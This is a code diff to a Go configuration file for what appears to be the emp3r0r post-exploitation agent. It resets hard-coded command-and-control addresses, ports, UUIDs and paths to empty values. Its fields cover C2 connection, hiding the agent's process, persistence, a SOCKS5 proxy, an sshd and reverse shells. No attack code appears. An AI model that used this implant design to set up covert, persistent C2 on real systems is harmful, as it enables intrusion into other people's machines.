@@ -12,7 +12,7 @@ import (
 
 var (
 	// CCAddress how our agent finds its CC
-	CCAddress = "https://192.168.122.170"
+	CCAddress = ""
 
 	// CCIP IP address of CC
 	CCIP = ""
@@ -42,7 +42,7 @@ var (
 	CDNProxy = ""
 
 	// SocketName name of our unix socket
-	SocketName = AgentRoot + "/fb5f9d"
+	SocketName = ""
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
@@ -54,46 +54,43 @@ var (
 	GuardianAgentPath = "[persistence_agent_path]"
 
 	// Version record version on build time
-	Version = "v1.3.14-7-g78e4a76"
+	Version = ""
 
 	// AgentRoot root directory
-	AgentRoot = "/tmp/d55309c3"
+	AgentRoot = ""
 
 	// UtilsPath binary path of utilities
-	UtilsPath = AgentRoot + "/ab568e5"
+	UtilsPath = ""
 
 	// LibPath
-	LibPath = AgentRoot + "/lib"
+	LibPath = ""
 
 	// DefaultShell the shell to use, use static bash binary when possible
-	DefaultShell = UtilsPath + "/bash"
-
-	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
-	Libemp3r0rFile = UtilsPath + "/libe.so"
+	DefaultShell = "/bin/sh"
 
 	// PIDFile stores agent PID
-	PIDFile = AgentRoot + "/d96352a"
+	PIDFile = ""
 
 	// CCPort port of c2
-	CCPort = "14232"
+	CCPort = ""
 
 	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
-	ProxyPort = "8875"
+	ProxyPort = ""
 
 	// SSHDPort port of sshd
-	SSHDPort = "46525"
+	SSHDPort = ""
 
 	// ReverseProxyPort for reverse proxy
 	ReverseProxyPort = ""
 
 	// BroadcastPort port of broadcast server
-	BroadcastPort = "45656"
+	BroadcastPort = ""
 
 	// BroadcastIntervalMin broadcast wait seconds
 	BroadcastIntervalMin = 30
 
 	// BroadcastIntervalMax broadcast wait seconds
-	BroadcastIntervalMax = 0
+	BroadcastIntervalMax = 120
 
 	// CCIndicator check this before trying connection
 	CCIndicator = ""
@@ -108,7 +105,7 @@ var (
 	IndicatorWaitMax = 120
 
 	// AgentUUID uuid of this agent
-	AgentUUID = "70ed075b-a412-11ec-8721-1f7c2810e0df"
+	AgentUUID = ""
 
 	// AgenTag tag of this agent
 	AgentTag = ""
@@ -116,7 +113,7 @@ var (
 
 const (
 	// OpSep separator of CC payload
-	OpSep = "3276d368-8400-11ec-9ac4-b9d591256de4"
+	OpSep = ""
 
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
